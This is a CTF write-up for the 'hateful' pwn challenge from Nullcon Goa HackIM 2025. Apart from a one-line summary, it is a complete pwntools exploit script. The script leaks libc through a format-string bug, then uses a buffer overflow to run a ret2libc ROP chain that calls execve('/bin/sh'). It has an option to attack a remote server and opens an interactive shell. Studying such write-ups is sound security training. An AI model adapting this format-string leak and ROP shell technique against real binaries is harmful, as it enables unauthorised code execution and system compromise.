---
title: "hateful - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "ret2libc", "eval", "hateful", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "There's BOF and fomatstring vuln, we use formatstring vuln to leak libc and use BOF to do ROP ret2libc"
source:
  name: "CTFtime writeup #39902"
  url: "https://ctftime.org/writeup/39902"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "hateful"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** hateful
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/39902>

---
There's BOF and fomatstring vuln, we use formatstring vuln to leak libc and use BOF to do ROP ret2libc

```

from pwn import *  
from sys import *

context.log_level = 'warning'  
#context.terminal = ["tmux", "splitw", "-h"]  
elf = context.binary = ELF("./hateful_patched")  
p = process("./hateful_patched")  
libc = ELF("./libc.so.6")

HOST = '52.59.124.14'  
PORT = 5020

cmd = """  
b*main  
"""  
if(argv[1] == 'gdb'):  
gdb.attach(p,cmd)  
elif(argv[1] == 'rm'):  
p = remote(HOST,PORT)

#__strcmp_avx2  
p.sendlineafter(b'>> ', b'yay')  
p.sendlineafter(b'>> ', b'%5$p')  
p.recvuntil(b'email provided: ')  
res = eval(p.recvline().rstrip())  
libc.address = (res - libc.sym['_IO_2_1_stdin_'])  
print(hex(libc.address))

rop = ROP(libc)  
rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

payload = b'A'*1008  
payload += p64(0xdead)  
payload += rop.chain()  
p.sendlineafter(b'!\n', payload)

p.interactive()  
```
